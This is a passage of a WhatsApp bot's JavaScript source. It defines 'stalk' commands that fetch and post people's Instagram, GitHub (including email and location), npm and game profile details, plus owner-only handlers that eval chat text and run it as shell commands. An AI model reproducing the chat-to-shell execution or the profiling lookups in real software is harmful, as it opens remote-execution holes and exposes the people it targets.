addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!q) return reply(`Contoh ${command} kirbotz-api`)
eha = await npmstalk.npmstalk(q)
reply(`*/ Stalking Npm \\*

Nama : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case prefix+'instagramstalk':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!q) return reply(`Contoh ${command} kirbotzx`)
aj = await instagramstalk.instagramstalk(`${q}`)
kirbotz.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`*/ Stalking Instagram \\*

Fullname : ${aj.fullname}
Username : ${aj.username}
Post : ${aj.post}
Followers : ${aj.followers}
Following : ${aj.following}
Bio : ${aj.bio}` }, { quoted: m } )
}
break
case prefix+'githubstalk':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!q) return reply(`Contoh ${command} KirBotz`)
aj = await githubstalk.githubstalk(`${q}`)
kirbotz.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Stalking Github \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case prefix+'ffstalk':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!q) return reply(`Contoh ${command} 946716486`)
eeh = await ffstalk.ffstalk(`${q}`)
reply(`*/ Stalking Freefire \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case prefix+'mlstalk': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!q) return reply(`Contoh ${command} 530793138|8129`)
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
reply(`*/ Stalking Mobile Legengd \\*

Username ${dat.userName}
Id : ${q.split("|")[0]}
Zoneid : ${q.split("|")[1]}`)
}
break
default:
}
if (budy.startsWith('=>')) {
if (!itsKirBotz) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}
if (budy.startsWith('>')) {
if (!itsKirBotz) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!itsKirBotz) return
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!itsKirBotz) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
} catch (err) {
m.reply(util.format(err))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
